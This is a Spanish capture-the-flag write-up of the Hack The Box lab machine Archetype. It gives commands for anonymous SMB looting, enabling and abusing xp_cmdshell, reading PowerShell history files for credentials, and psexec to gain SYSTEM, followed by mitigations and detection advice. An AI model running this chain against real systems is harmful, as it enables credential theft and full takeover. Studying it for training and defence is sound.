---
machine: Archetype
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, smb, mssql, xp_cmdshell, psexec, tier2]
---

# Archetype — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 2 · Windows · Very Easy

## TL;DR

Share `backups` con sesión nula entrega `prod.dtsConfig` con la contraseña de `sql_svc`. Con MSSQL y `xp_cmdshell` se obtiene shell, el historial de PowerShell guarda la contraseña de `Administrator` y `psexec` cierra con **SYSTEM**.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
135/tcp  msrpc
139/tcp  netbios-ssn
445/tcp  microsoft-ds
1433/tcp Microsoft SQL Server 2019
```

## Enumeración

```bash
smbclient -N -L //<TARGET_IP>
smbclient -N //<TARGET_IP>/backups
smb: \> get prod.dtsConfig
```

```xml
<ConfiguredValue>Data Source=.;Password=<PASSWORD>;User ID=ARCHETYPE\sql_svc;...</ConfiguredValue>
```

- El share no administrativo `backups` es accesible sin credenciales.
- El fichero es una configuración de SSIS: credenciales en claro del servicio SQL.

## Foothold

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:'<PASSWORD>'@<TARGET_IP> -windows-auth
```

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```text
archetype\sql_svc
```

Se descarga un reverse shell de PowerShell y se ejecuta con `xp_cmdshell`; la shell llega como `sql_svc`.

## Movimiento lateral

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```text
net use T: \\Archetype\backups /user:administrator <ADMIN_PASSWORD>
```

El administrador montó el share desde consola y PSReadLine guardó la contraseña en claro.

## Escalada de privilegios

```bash
impacket-psexec administrator:'<ADMIN_PASSWORD>'@<TARGET_IP>
```

```text
nt authority\system
```

- `psexec` escribe en `ADMIN$` y crea un servicio temporal.
- Flags: `C:\Users\sql_svc\Desktop\user.txt` y `C:\Users\Administrator\Desktop\root.txt`.

## Evidencia

- `prod.dtsConfig` con la contraseña redactada.
- Historial de PowerShell redactado y `whoami` como SYSTEM.

## Lecciones aprendidas

- Un share «de backups» suele contener configuración con secretos.
- `xp_cmdshell` está deshabilitado por defecto pero un `sysadmin` lo reactiva en dos líneas.
- El historial de PSReadLine es un artefacto de credenciales de primer nivel.
- `-windows-auth` es necesario cuando la instancia usa autenticación integrada.

## Mitigaciones y detección

- Shares sin sesión nula; cifrar secretos de SSIS (`/e` o Key Vault).
- `sql_svc` sin `sysadmin`; `xp_cmdshell` deshabilitado y auditado.
- Limpiar historiales y no escribir contraseñas en la línea de comandos.
- Detección: 4624 tipo 3 anómalo, `xp_cmdshell` en el log de SQL, servicio 7045 tras SMB.

- CWE-522, CWE-269
- MITRE ATT&CK: [T1552.001 Credentials in Files](https://attack.mitre.org/techniques/T1552/001/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

## Referencias

- [Impacket — mssqlclient.py](https://github.com/fortra/impacket)
- [HackTricks — MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
